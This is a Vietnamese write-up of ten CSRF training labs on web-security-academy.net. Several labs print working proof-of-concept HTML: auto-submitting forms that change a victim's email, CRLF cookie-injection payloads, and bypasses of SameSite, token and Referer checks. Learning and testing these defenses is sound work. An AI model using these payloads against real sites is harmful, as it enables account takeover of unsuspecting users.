## Lab 1: CSRF vulnerability with no defenses

__Lỗ hổng CSRF mà web không có bất kỳ biện pháp phòng thủ nào__

![2025-11-21-13-54-04](../images/2025-11-21-13-54-04.png)

Thay đổi email của nạn nhân

![2025-11-21-13-53-44](../images/2025-11-21-13-53-44.png)

Đổi email một lần để lấy request chuẩn

![2025-11-21-13-55-22](../images/2025-11-21-13-55-22.png)

Xem kĩ request thì thấy chỉ có duy nhất `Cookie session` và không có bất kì xác thực nào chứng minh rằng đúng người yêu cầu

![2025-11-21-13-58-31](../images/2025-11-21-13-58-31.png)

Gen mã *HTML* thực hiện việc tấn công `CSRF`

![2025-11-21-13-59-41](../images/2025-11-21-13-59-41.png)

Lưu code vào sever kiểm soát\
Vì lab nói rằng không thể có 2 mail trùng nhau\
--> Trước khi gửi cho victim cần thay đổi email tránh bị trùng với tài khoản của mình

![2025-11-21-14-09-42](../images/2025-11-21-14-09-42.png)

## Lab 2: CSRF where token validation depends on request method

__CSRF trong đó việc kiểm tra token phụ thuộc vào loại phương thức request (GET/POST)__

![2025-11-21-14-32-54](../images/2025-11-21-14-32-54.png)

Lab yêu cầu đổi emai của nạn nhân

![2025-11-21-14-33-49](../images/2025-11-21-14-33-49.png)

Đăng nhập vào `wiener:peter`

![2025-11-21-14-35-06](../images/2025-11-21-14-35-06.png)

Đổi email thành `test_001@gmail.com` để lấy request chuẩn
--> Request đã bao gồm cả mã `CSRF`

![2025-11-21-14-36-31](../images/2025-11-21-14-36-31.png)

Đổi request method thành GET\
--> Server vẫn trả về `302`

![2025-11-21-14-37-34](../images/2025-11-21-14-37-34.png)

Kiểm tra thấy tài khoản đã được đổi email

![2025-11-21-14-38-16](../images/2025-11-21-14-38-16.png)

Khi xóa đi tham số `csrf` thì server vẫn chấp nhận với method `GET`

![2025-11-21-14-38-52](../images/2025-11-21-14-38-52.png)

Kiểm tra tài khoản và thấy email đã được đổi ngay khi không có mã `CSRF`

![2025-11-21-14-40-04](../images/2025-11-21-14-40-04.png)

Tạo mã *HTML* để có thể lưu trữ trên máy chủ mình kiểm soát

![2025-11-21-14-41-18](../images/2025-11-21-14-41-18.png)

Sang server kiểm soát và lưu trữ đoạn `HMTL`

![2025-11-21-14-42-20](../images/2025-11-21-14-42-20.png)

Thử truy câp bằng link của server\--> Email đã tự động được đổi

![2025-11-21-14-43-12](../images/2025-11-21-14-43-12.png)

Đổi email và gửi cho victim\--> Solve lab\
Lab chỉ xác thực `CSRF` cho method `POST` còn `GET` thì không cần mã `CSRF` vẫn có thể thực hiện được hành động tương tự

## Lab 3: CSRF where token validation depends on token being present

__CSRF xảy ra khi web chỉ kiểm tra xem token có tồn tại hay không, chứ không kiểm tra token đó đúng hay sai__

![2025-11-21-14-47-21](../images/2025-11-21-14-47-21.png)

Lab yêu cầu đổi email của victim thông qua lỗ hổng CSRF

![2025-11-21-14-48-16](../images/2025-11-21-14-48-16.png)

Loggin vào tài khoản `wiener`

![2025-11-21-14-49-16](../images/2025-11-21-14-49-16.png)

Đổi email 1 lần để có được request đổi email

![2025-11-21-14-50-21](../images/2025-11-21-14-50-21.png)

Khi xóa đi tham số `csrf` thì server vẫn trả về `302`

![2025-11-21-14-51-23](../images/2025-11-21-14-51-23.png)

Kiểm tra thì thấy email đã được đổi

![2025-11-21-14-51-54](../images/2025-11-21-14-51-54.png)

Tạo mã HTML để lưu trữ lên máy chủ ta kiểm soát

```HTML
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aa300e604f940b084b4951a00200031.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#95;0021&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
![2025-11-21-14-53-35](../images/2025-11-21-14-53-35.png)

Khi truy cập bằng link đó thì email đã tự động được đổi

![2025-11-21-14-55-01](../images/2025-11-21-14-55-01.png)

Sửa email và gửi cho victim\--> Solve lab\

![2025-11-21-14-56-17](../images/2025-11-21-14-56-17.png)

Khi để lại tham số `CSRF` nhưng đã chỉnh sửa thì thấy server vẫn kiểm tra\
--> Lab này chỉ kiểm tra tham số `CSRF` khi nó có mặt, còn khi không có thì nó không kiểm tra luôn

## Lab 4: CSRF where token is not tied to user session

__CSRF xảy ra khi token không gắn với phiên đăng nhập của người dùng__

![2025-11-21-15-00-39](../images/2025-11-21-15-00-39.png)

Lab yêu cầu đổi email của victim thông qua lỗ hổng *CSRF*

![2025-11-21-15-02-57](../images/2025-11-21-15-02-57.png)

Đăng nhập vào tài khoản `wiener`

![2025-11-21-15-08-26](../images/2025-11-21-15-08-26.png)

Khi đổi email nhưng xóa đi trường `CSRF` thì server nói rằng `"Missing parameter 'csrf'"`

![2025-11-21-15-12-44](../images/2025-11-21-15-12-44.png)

Ý tường: lấy `CSRF login` của wiener và nhập vào trường `CSRF change email` của carlos\
--> Server `"Invalid CSRF token"`--> __False__

![2025-11-21-15-22-20](../images/2025-11-21-15-22-20.png)

Bật `Intercept` và lấy một lần request đổi email, nhưng khi gặp được request đó thì lấy mã `CSRF` và bỏ yêu cầu đó\--> Có được mã `CSRF` hợp lệ

![2025-11-21-15-27-48](../images/2025-11-21-15-27-48.png)

Email của carlos ban đầu là: `carlos1@dontwannacry.com`

![2025-11-21-15-28-47](../images/2025-11-21-15-28-47.png)

Lấy request đổi email của carlos và điền tham số `CSRF` vừa lấy được vào\--> server trả về `300`

![2025-11-21-15-29-43](../images/2025-11-21-15-29-43.png)

Lúc này email của carlos đã được cập nhật: `carlos2@dontwannacry.com`

![2025-11-21-15-31-13](../images/2025-11-21-15-31-13.png)

Làm lại bước như trước để lấy được mã `CSRF` hợp lệ và tạo mã *HTML* để lưu trữ

![2025-11-21-15-32-53](../images/2025-11-21-15-32-53.png)

Gửi cho victim\--> Solve lab\--> Lab cho thấy mã `CSRF` không được liên kết với `Session Cookie` --> dẫn đến việc lấy `CSRF` của tài khoản này dùng được cho tài khoản khác

## Lab 5: CSRF where token is tied to non-session cookie

__CSRF xảy ra khi token được gắn với một cookie KHÔNG phải cookie phiên__

![2025-11-21-15-41-43](../images/2025-11-21-15-41-43.png)

![2025-11-21-15-45-16](../images/2025-11-21-15-45-16.png)

Khi đổi email server không chỉ có 1 `session cookie` mà còn có cả `csrfKey`

![2025-11-21-15-47-55](../images/2025-11-21-15-47-55.png)

Bật `Intercept` và lấy 2 trường `csrf` và `csrfKey`

![2025-11-21-15-50-55](../images/2025-11-21-15-50-55.png)

Sử dụng cặp `csrf` và `csrfKey` vừa lấy được đưa vào request đổi email của `carlos`--> Server trả về `300`

![2025-11-21-15-52-15](../images/2025-11-21-15-52-15.png)

Qua kiểm tra thì thấy email của `carlos` đã được thay đổi

![2025-11-21-16-18-47](../images/2025-11-21-16-18-47.png)

Tạo mã HTML để lưu trữ, vì có cả `csrfKey` nên phải nghĩ cách set cho nó

```HTML
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a0f006504e3c02380ef1c5d00d40095.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test_1000a22_&#64;carlos&#45;montoya&#46;net" />
      <input type="hidden" name="csrf" value="ubDXn0VZuMttxghOLimw91hNxB3dDuVv" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a0f006504e3c02380ef1c5d00d40095.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=uHzdPbkowQhOI6V0bTkD9IHtZg4rJ75w%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

![2025-11-21-16-20-05](../images/2025-11-21-16-20-05.png)

Khi vào bằng link của server kiểm soát, email đã được thay đổi

![2025-11-21-16-22-39](../images/2025-11-21-16-22-39.png)

Tiếp tục lấy `csrf` và `csrfKey` thay vào và gửi cho victim\
Solve lab\
Lab này cho thấy mã `CSRF` không được liên kết với `Session cookie`
--> Không có ý nghĩa

## Lab 6: CSRF where token is duplicated in cookie

__Lỗi CSRF khi token được lưu trùng lặp trong cookie__

![2025-11-21-16-27-37](../images/2025-11-21-16-27-37.png)

![2025-11-21-16-29-47](../images/2025-11-21-16-29-47.png)

Đổi email một lần và thấy mã `CSRF` được xuất hiên ở 2 nơi:
- Cạnh `Session Cookie`
- Dưới phần tham số gửi đi\
--> Đặc điểm là chứng giống hệt nhau

![2025-11-21-16-44-25](../images/2025-11-21-16-44-25.png)

Thử thay đổi `csrf` thành một giá trị bất kì\
Server: `"Invalid CSRF token"`\
Nhưng khi đổi lại thành `CSRF` cũ thì lại được\
--> Server chỉ chấp nhận những mã hợp lệ trên server

![2025-11-21-16-46-16](../images/2025-11-21-16-46-16.png)

Viết mã HTML để lưu trữ trên server kiểm soát\
Thay thế `CSRF` bằng giá trị của `wiener`\

![2025-11-21-16-47-34](../images/2025-11-21-16-47-34.png)

Khi truy cập vào link thì thấy email đã được thay đổi

![2025-11-21-16-49-01](../images/2025-11-21-16-49-01.png)

Nhưng khi gửi cho victim thì chưa thấy solve

![2025-11-21-16-58-20](../images/2025-11-21-16-58-20.png)

Bởi vì chức năng search của web không có mã `CSRF` nên lợi dụng nó để set cho nó trước rồi sử dụng nó sau bằng đoạn injection:\
`test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None`
Lúc này `CSRF` đã có giá trị banwfh `fake`

![2025-11-21-17-00-19](../images/2025-11-21-17-00-19.png)

Dùng lại `CSRF=fake` để đổi email\
Server đã cho đổi\
Ý tưởng: set cho mã `CSRF` của victim một giá trị cụ thể mà có thể biết, sau đó dùng chính nó để có thể đổi mật khẩu

```HTML
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a300015043478b180de035200b00099.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test_1111_&#64;carlos&#45;montoya&#46;net" />
      <input type="hidden" name="csrf" value="fake123" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a300015043478b180de035200b00099.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake123%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

![2025-11-21-17-08-28](../images/2025-11-21-17-08-28.png)

## Lab 7: SameSite Lax bypass via method override

__Vượt qua bảo vệ SameSite=Lax bằng cách giả vờ đổi method request__

![2025-11-23-20-25-45](../images/2025-11-23-20-25-45.png)

Lab yêu cầu đổi email của victim

![2025-11-23-20-27-35](../images/2025-11-23-20-27-35.png)

Đổi mail ở tài khoản có thể truy cập rồi lấy request mẫu

![2025-11-23-20-28-28](../images/2025-11-23-20-28-28.png)

![2025-11-23-20-28-50](../images/2025-11-23-20-28-50.png)

Tạo một đoạn mã HTML để lưu trữ trên server

![2025-11-23-20-30-26](../images/2025-11-23-20-30-26.png)

Khi lưu trữ rồi thử truy cập link thì thấy tài khoản đã bị đẩy logout

![2025-11-24-10-13-45](../images/2025-11-24-10-13-45.png)

Đổi method thành `GET` thì server không chấp nhận method `GET` cho thao tác đổi email

![2025-11-24-10-12-57](../images/2025-11-24-10-12-57.png)

Bypass ghi đè method bằng cách thêm tham số `_method`\
--> Server trả về `302`

![2025-11-24-10-21-48](../images/2025-11-24-10-21-48.png)

Kiểm tra tài khoản và thấy email đã được thay đổi

![2025-11-24-11-11-06](../images/2025-11-24-11-11-06.png)

![2025-11-24-11-11-09](../images/2025-11-24-11-11-09.png)

Từ request đó ta sẽ gen một đoạn mã HTML để lưu trữ trên server
```HTML
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ade00bd03b23a26aa32c99500100076.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="test&#95;002&#64;gmail&#46;com" />
      <input type="hidden" name="&#95;method" value="POST" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
![2025-11-24-11-12-54](../images/2025-11-24-11-12-54.png)

Lưu trữ nó trên server

![2025-11-24-11-13-16](../images/2025-11-24-11-13-16.png)

Truy cập vào link file đó thì thấy email của tài khoản đã được đổi

![2025-11-24-11-14-10](../images/2025-11-24-11-14-10.png)

Gửi cho victim để solve lab

## Lab 8: SameSite Strict bypass via client-side redirect

__Vượt qua bảo vệ SameSite=Strict bằng chuyển hướng phía client__

![2025-11-24-11-27-41](../images/2025-11-24-11-27-41.png)

Lab yêu cầu đổi email của victim

![2025-11-24-21-23-59](../images/2025-11-24-21-23-59.png)

Khi login vào ta thấy web đã được cấu hình `SameSite=Strict`

![2025-11-24-21-27-56](../images/2025-11-24-21-27-56.png)

Đổi thử email một lần --> `302`

![2025-11-24-21-28-28](../images/2025-11-24-21-28-28.png)

Kiểm tra lại thấy email đã thay đổi 

![2025-11-24-21-28-57](../images/2025-11-24-21-28-57.png)

Gen code HMTL 

![2025-11-24-21-31-12](../images/2025-11-24-21-31-12.png)

Sau khi truy cập link của server thì web đã logout tài khoản ra\
--> Failed

![2025-11-24-21-33-31](../images/2025-11-24-21-33-31.png)

Đổi method từ POST sang GET\
--> Server vẫn chấp nhận hành động đổi email bằng method GET\
Nhưng vì web cấu hình `SameSite=Strict` nên dù có chấp nhận GET nhưng phải làm sao để cho web tự động chuyển hướng GET về `/my-account/change-email?email=example@gmail.com`

![2025-11-24-21-36-38](../images/2025-11-24-21-36-38.png)
![2025-11-24-21-36-25](../images/2025-11-24-21-36-25.png)

Xem chức năng bình luận của web\
Ta thấy khi gửi một comment lên thấy web chuyển ta đến một trang xác nhận đã post comment lên, sau đó lại chuyển hướng về bài viết ta vừa bình luận và cho phép ta xem lại bài viết đó và bình luận

![2025-11-24-21-39-51](../images/2025-11-24-21-39-51.png)
![2025-11-24-21-40-16](../images/2025-11-24-21-40-16.png)

Trong `HTTP history` thì đã thấy được flow của chức năng này

![2025-11-24-21-40-58](../images/2025-11-24-21-40-58.png)

Đây chính là đoạn mã giúp web chuyển hướng sau khi xác nhận đã post comment

```JS
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```
--> Đoạn code này lấy thẳng giá trị của `postId` để ghép vào rồi chuyển hướng thẳng về URL đó\
--> Có thể lợi dụng chức năng xác nhận comment để có thể khiến web tự chuyển hướng về `/my-account/change-email?email=example@gmail.com`

![2025-11-24-21-47-11](../images/2025-11-24-21-47-11.png)

Khi quét map thì có thể thấy đang ở thư mục `post` và ta đang cần chuyển hướng đến `myaccount` thì ta có thể dùng `Path Travesal`

![2025-11-24-21-49-41](../images/2025-11-24-21-49-41.png)

Dù đã thành công với request này nhưng email vẫn chưa bị đổi vì nó không tự động chuyển hướng\
Nên ta lấy URL của request này và chạy thẳng ở trình duyệt để có thể chuyển hướng

![2025-11-24-21-51-11](../images/2025-11-24-21-51-11.png)

Khi chạy ở trình duyệt nó nói thiếu tham số `submit`

![2025-11-24-21-52-19](../images/2025-11-24-21-52-19.png)

Ta sẽ encode URL của tham số `submit`

![2025-11-24-21-52-59](../images/2025-11-24-21-52-59.png)

Khi chạy đã thấy nó thành công đổi email qua request đó 

![2025-11-24-21-53-35](../images/2025-11-24-21-53-35.png)

Gen HTML

![2025-11-24-21-54-34](../images/2025-11-24-21-54-34.png)

Khi truy cập bằng link của server ta kiểm soát thì thấy đã đổi email thành công

![2025-11-24-21-55-38](../images/2025-11-24-21-55-38.png)

Gửi cho victim để solve lab


--> Để có thể bypass được web cấu hình `SameSite Strict` thì cần có:
- Web cho phép chức năng đó thực hiện bằng method _GET_
- Web có chức năng nào đó có thể chuyển hướng tự động qua lại trong site

## Lab 9: CSRF where Referer validation depends on header being present

__CSRF xảy ra khi việc kiểm tra Referer chỉ được thực hiện khi header này xuất hiện__

![2025-11-25-15-03-12](../images/2025-11-25-15-03-12.png)

Lab yêu cầu đổi email của victim và cho biết trang web không cho phép request được gửi từ domain khác

![2025-11-25-15-04-46](../images/2025-11-25-15-04-46.png)

Đổi email thử một lần 

![2025-11-25-15-05-05](../images/2025-11-25-15-05-05.png)

Check email và thấy đã được đổi 

![2025-11-25-15-06-00](../images/2025-11-25-15-06-00.png)

Tạo HTML để lưu trữ trên server

![2025-11-25-15-06-47](../images/2025-11-25-15-06-47.png)

Khi truy cập bằng link của server thì nó đã chặn lại bằng việc kiểm tra Header `Referer`: _"Invalid referer header"_\
--> Phải làm thế nào để server của ta khi gửi request sẽ không gửi Header `Referer`\
--> Thêm thẻ 
```HTML
<meta name="referrer" content="never">
```
--> HTML hiện tại:
```HTML
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0acf00f3043c59b58017034600fe00dc.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#95;005&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
	  <meta name="referrer" content="never">
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit(); 
    </script>
  </body>
</html>
```
--> Lưu lên server

![2025-11-25-15-11-37](../images/2025-11-25-15-11-37.png)

Khi truy cập bằng link của server thì thấy email đã được đổi

![2025-11-25-15-12-23](../images/2025-11-25-15-12-23.png)

Chỉnh lại email và gửi cho victim để solve lab

## Lab 10: CSRF with broken Referer validation

__CSRF do cơ chế kiểm tra Referer bị lỗi__

![2025-11-25-15-24-00](../images/2025-11-25-15-24-00.png)

Lab yêu cầu đổi email của victim, cho biết rằng web chặn những request đến từ site khác

![2025-11-25-15-21-54](../images/2025-11-25-15-21-54.png)

Đổi mật khẩu 1 lần để lấy request

![2025-11-25-15-23-10](../images/2025-11-25-15-23-10.png)

Khi xóa Header `Referer` thì server trả về _"Invalid referer header"_

![2025-11-25-15-26-36](../images/2025-11-25-15-26-36.png)

Khi giữ lại Header `Referer` nhưng đổi thành URL của site khác\
--> Web vẫn chặn

![2025-11-25-15-27-46](../images/2025-11-25-15-27-46.png)

Khi truyền vào Header `Referer: https://example.com/test?https://0aa0001f03710643809712c0007e0021.web-security-academy.net` thì web trả về `302`

![2025-11-25-15-29-04](../images/2025-11-25-15-29-04.png)

Kiểm tra thì thấy email đã được thay đổi\
--> Web kiểm tra giá trị của Header `Referer` chỉ cần có chuỗi tên miền chính của nó là có thể thực hiện hành động\
--> Bây giờ muốn gửi cho victim mà Header `Referer` có chứa chuỗi tên miền của web thì một là làm một tên miền là subdomain của tên miền chính đó, hai là gửi request mà có chứa chuỗi đó là được

![2025-11-25-15-38-06](../images/2025-11-25-15-38-06.png)

Lưu HTML vào server với file : `/exploit.html/test?=https://0aa0001f03710643809712c0007e0021.web-security-academy.net` và header có `Referrer-Policy: unsafe-url` để có thể gửi full cả đuôi của file 

![2025-11-25-15-38-30](../images/2025-11-25-15-38-30.png)

Nhưng khi truy cập link thì vẫn báo `Invalid referer header"`\
--> Failed\

```JS
history.pushState('', '', '/');
```
--> Bởi vì đoạn JS này đã cắt mất phần `test?https://0aa0001f03710643809712c0007e0021.web-security-academy.net`\
--> Mất chuỗi domain\
--> Failed

![2025-11-25-15-43-58](../images/2025-11-25-15-43-58.png)

Với request đã xóa đi 

```JS
history.pushState('', '', '/');
```
--> Server đã cho phép đổi email 

![2025-11-25-15-45-01](../images/2025-11-25-15-45-01.png)

Kiểm tra đã thấy email được đổi

Nhưng khi gửi cho victim thì thấy chưa solve lab\
Xem xét lại chức năng của `history.pushState('', '', '');`\
Nó giúp chúng ta có thêm thêm tham số vào cuối URL mà không cần reload lại trang bằng tham số thứ 3

```HTML
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aa0001f03710643809712c0007e0021.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#95;final2&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
         history.pushState('','', '/test?0aa0001f03710643809712c0007e0021.web-security-academy.net')
         document.forms[0].submit();
    </script>
  </body>
</html>
```
--> Vậy nên bây giờ ta sẽ cho chuỗi chứa domain của web vào để có thể bypass filter của web 

![2025-11-25-16-02-31](../images/2025-11-25-16-02-31.png)

Khi truy cập bằng link của server thì thấy email của user đã được đổi

![2025-11-25-16-03-24](../images/2025-11-25-16-03-24.png)

Thử đổi email và gửi cho victim\
--> Solve lab



